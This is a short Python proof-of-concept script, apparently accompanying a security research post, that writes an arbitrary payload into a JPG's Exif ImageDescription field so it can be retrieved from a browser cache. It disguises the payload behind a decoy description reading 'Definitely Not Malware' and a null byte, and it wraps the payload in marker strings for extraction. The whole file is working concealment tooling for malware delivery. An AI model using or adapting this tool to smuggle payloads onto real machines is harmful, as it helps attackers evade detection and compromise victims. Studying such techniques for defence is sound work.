import argparse
import piexif
from PIL import Image

"""
    Exif Smuggling PoC - store payloads into jpg metadata for use with Cache Smuggling 
    See: https://malwaretech.com/2025/10/exif-smuggling.html
"""

def write_payload_to_exif(input_file, output_file, payload_file):
    """
    Write an arbitrary payload to a JPG's Exif ImageDescription field for JPG smuggling.
    Note: EXIF fields have a 64-KB size limit, so payload must not exceed this.

    Args:
        input_file: JPG file to be used for exif smuggling
        output_file: file to save the modified JPG file to
        payload_file: payload to write to Exif
    """
    with open(payload_file, 'rb') as f:
        payload_data = f.read()
        f.close()

    if len(payload_data) >= 65536 or len(payload_data) < 1:
        raise ValueError('Payload must be between 1 and 64-KB')

    try:
        # if exif data already present, we can reuse it and only overwrite the field we need
        exif_dict = piexif.load(input_file)
    except:
        exif_dict = {'0th': {}, 'Exif': {}, 'GPS': {}, '1st': {}}

    exif_dict['Exif'][piexif.ExifIFD.ExifVersion] = b'1337.1337'

    # what the viewer will see in the "Image Description" field if viewed in explorer
    image_description = b'Definitely Not Malware\x00'

    # prepend a null byte to hide rest of Exif then wrap the payload in tags so we can easily extract it from the cache
    full_payload = image_description + b'13371337' + payload_data + b'13371337'
    if len(full_payload) > 65536:
        raise ValueError('the payload + encapsulating data must be less than 65536 bytes')

    # set the Exif Image Description field
    exif_dict['0th'][piexif.ImageIFD.ImageDescription] = full_payload
    exif_bytes = piexif.dump(exif_dict)

    img = Image.open(input_file)
    img.save(output_file, exif=exif_bytes, quality=100)

    print(f'Wrote {len(payload_data)} bytes to ImageDescription of {output_file}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='exif_smuggling.py', description='PoC for storing payloads into JPG Exif data (see: https://malwaretech.com/2025/10/exif-smuggling.html)')
    parser.add_argument('-i', '--input-file', dest='input_file', help='Path to the JPG file to use as a base for the Exif Smuggling', required=True)
    parser.add_argument('-o', '--output-file', dest='output_file', help='Path to save the output JPG to', required=True)
    parser.add_argument('-p', '--payload', dest='payload', help='Path to the payload to store into the JPG Exif data', required=True)
    args = parser.parse_args()

    write_payload_to_exif(args.input_file, args.output_file, args.payload)